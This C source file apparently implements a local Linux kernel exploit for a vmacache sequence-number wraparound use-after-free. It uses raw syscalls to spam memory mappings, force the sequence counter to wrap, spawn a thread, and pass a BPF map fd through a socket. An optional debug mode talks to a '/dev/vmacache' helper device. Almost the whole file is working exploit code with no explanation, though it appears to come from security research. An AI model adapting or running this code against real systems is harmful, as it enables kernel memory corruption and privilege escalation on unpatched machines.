#include "vmacache_helper.h"

#define PROT_RO 1
#define PROT_RW 3
#define PROT_RX 5

#define MAP_PRIV_ANON 0x22
#define MAP_FIXED 0x10

// mirrors the sequence number on the mm_struct, except without the 2^32 wrap
long sequence_mirror = 2;

#define FAST_WRAP_AREA ((char*)0x400000000000UL)
#define PAGE_SIZE 0x1000UL

#define UAF_VMA_AREA ((char*)0x400000010000UL)
#define CHILD_STACK_AREA ((char*)0x410000000000UL)
#define VMA_SPAM_AREA ((char*)0x420000000000UL)
#define VMA_SPAM_COUNT 10000UL
#define VMA_SPAM_DELTA (2*PAGE_SIZE)
#define VMA_SPAM_AREA_SIZE (VMA_SPAM_COUNT*VMA_SPAM_DELTA)

static void memset(void *p_, int c, unsigned long n) {
	char *p = p_;
	while (n) {
		*p = c;
		p++;
		n--;
	}
}

static long syscall(long nr, unsigned long a1,
		    unsigned long a2, unsigned long a3,
		    unsigned long a4, unsigned long a5,
		    unsigned long a6) {
	long res = nr;
	asm volatile(
		"mov %[a4], %%r10\n\t"
		"mov %[a5], %%r8\n\t"
		"mov %[a6], %%r9\n\t"
		"syscall\n\t"
	: // out
		"+a"(res)
	: // in
		"D"(a1),
		"S"(a2),
		"d"(a3),
		[a4] "r"(a4),
		[a5] "r"(a5),
		[a6] "r"(a6)
	: // clobber
		"r10", "r8", "r9", "r11", "rcx", "cc", "memory"
	);
	return res;
}

#ifdef CHEAT
static int ctl_fd = -1;
static long ctl_call(int cmd, unsigned long arg) {
	return syscall(16, ctl_fd, cmd, arg, 0, 0, 0);
}
#endif

struct cmsg_fd {
	unsigned long cmsg_len;
	int cmsg_level;
	int cmsg_type;
	int fd;
} __attribute__((packed));
struct user_msghdr {
	void *msg_name;
	int msg_namelen;
	void/*struct iovec*/ *msg_iov;
	unsigned long msg_iovlen;
	void *msg_control;
	unsigned long msg_controllen;
	unsigned int msg_flags;
};
static void sendfd(int sock, int fd) {
	struct cmsg_fd cmsg = {
		.cmsg_len = sizeof(struct cmsg_fd),
		.cmsg_level = 1/*SOL_SOCKET*/,
		.cmsg_type = 0x01/*SCM_RIGHTS*/,
		.fd = fd
	};
	struct user_msghdr msg = {
		.msg_control = &cmsg,
		.msg_controllen = sizeof(cmsg)
	};
	syscall(46, sock, (unsigned long)&msg, 0, 0, 0, 0);
}

static void exit(int status) {
	//exit_group
	syscall(231, status, 0, 0, 0, 0, 0);
}

static void *mmap(void *a1, unsigned long a2, int a3, int a4, int a5, long a6) {
	return (void*)syscall(9, (unsigned long)a1, a2, a3, a4, a5, a6);
}

static void munmap_noadjacent(void *a1, unsigned long a2) {
	syscall(11, (unsigned long)a1, a2, 0, 0, 0, 0);
	sequence_mirror++;
}

static void sequence_double_inc(void) {
	mmap(FAST_WRAP_AREA + PAGE_SIZE, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON|MAP_FIXED, -1, 0);
	sequence_mirror += 2;
}
static void sequence_inc(void) {
	mmap(FAST_WRAP_AREA, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON|MAP_FIXED, -1, 0);
	sequence_mirror += 1;
}
static void sequence_target(long target) {
	while (sequence_mirror + 2 <= target)
		sequence_double_inc();
	if (sequence_mirror + 1 <= target)
		sequence_inc();
}
static void sequence_cheat_bump(long bump) {
#ifdef CHEAT
	ctl_call(SEQUENCE_BUMP, bump);
	sequence_mirror += bump;
#endif
}
static void do_dmesg_dump(void) {
#ifdef CHEAT
	ctl_call(DMESG_DUMP, 0);
#endif
}

static int sync_fd;
static void sync_add(int fd) {
	unsigned long val = 1;
	syscall(1, fd, (unsigned long)&val, 8, 0, 0, 0);
}
static void sync_dec(int fd) {
	unsigned long val;
	syscall(0, fd, (unsigned long)&val, 8, 0, 0, 0);
}

struct bpf_map_create_args {
	unsigned int map_type;
	unsigned int key_size;
	unsigned int value_size;
	unsigned int max_entries;
	unsigned int map_flags;
};

void child_main(void) {
	do_dmesg_dump();

	for (unsigned long i=VMA_SPAM_COUNT/2; i<VMA_SPAM_COUNT; i++) {
		munmap_noadjacent(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE);
	}

	struct bpf_map_create_args bpf_arg = {
		.map_type = 2,
		.key_size = 4,
		.value_size = 0x1000,
		.max_entries = 1024
	};
	int bpf_map = syscall(321, 0, (unsigned long)&bpf_arg, sizeof(bpf_arg), 0, 0, 0);

	sendfd(0, bpf_map);

	do_dmesg_dump();

	sequence_cheat_bump(0xffff0000L);
	sequence_target(0x1ffffffffL);

	sync_add(sync_fd);

	// exit
	syscall(60, 0, 0, 0, 0, 0, 0);
}

static int thread_create(char *child_stack) {
	int res;
	asm volatile(
		"mov $56, %%eax\n\t"
		"mov $0x50f00, %%edi\n\t"
		"mov %[child_stack], %%rsi\n\t"
		"xor %%rdx, %%rdx\n\t"
		"xor %%r10, %%r10\n\t"
		"xor %%r8, %%r8\n\t"
		"xor %%r9, %%r9\n\t"
		"syscall\n\t"
		"test %%eax, %%eax\n\t"
		"jnz 1f\n\t"

		// child process
		"call child_main\n\t"
		"ud2\n\t"

		"1:"
	: //out
		"=&a"(res)
	: //in
		[child_stack] "r"(child_stack)
	: //clobber
		"rdi", "rsi", "rdx", "r10", "r8", "r9", "r11", "rcx", "cc", "memory"
	);
	return res;
}

void _start(void) {
	unsigned char cpu_mask = 0x01;
	syscall(203, 0, 1, (unsigned long)&cpu_mask, 0, 0, 0);

#ifdef CHEAT
	ctl_fd = syscall(2, (unsigned long)"/dev/vmacache", 0, 0, 0, 0, 0);
#endif
	sync_fd = syscall(284, 0, 0, 0, 0, 0, 0);

	mmap(FAST_WRAP_AREA, 0x3000, PROT_RW, MAP_PRIV_ANON, -1, 0);
	//mmap(UAF_VMA_AREA, 0x1000, PROT_RW, MAP_PRIV_ANON, -1, 0);
	mmap(CHILD_STACK_AREA, 0x10000, PROT_RW, MAP_PRIV_ANON, -1, 0);
	memset(CHILD_STACK_AREA, 0xcc, 0x10000);

	do_dmesg_dump();

	sequence_cheat_bump(0xffff0000L);
	sequence_target(0x100000000L - VMA_SPAM_COUNT/2);

	for (unsigned long i=0; i<VMA_SPAM_COUNT; i++) {
		mmap(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE, PROT_RW, MAP_PRIV_ANON, -1, 0);
	}

	for (unsigned long i=0; i<VMA_SPAM_COUNT/2; i++) {
		munmap_noadjacent(VMA_SPAM_AREA + i * VMA_SPAM_DELTA, PAGE_SIZE);
	}

	do_dmesg_dump();

	thread_create(CHILD_STACK_AREA+0x10000);
	sync_dec(sync_fd);

	do_dmesg_dump();

	// trigger dmesg dump. use high address to avoid pollution.
	syscall(1, sync_fd, 0x7fffffffd000, 8, 0, 0, 0);

	// fd 1 is an eventfd for sync with the puppeteer
	sync_dec(1);

	do_dmesg_dump();

	syscall(0, 1, 0x7fffffffd000, 8, 0, 0, 0x01010101feedf00d);

	exit(0);
}
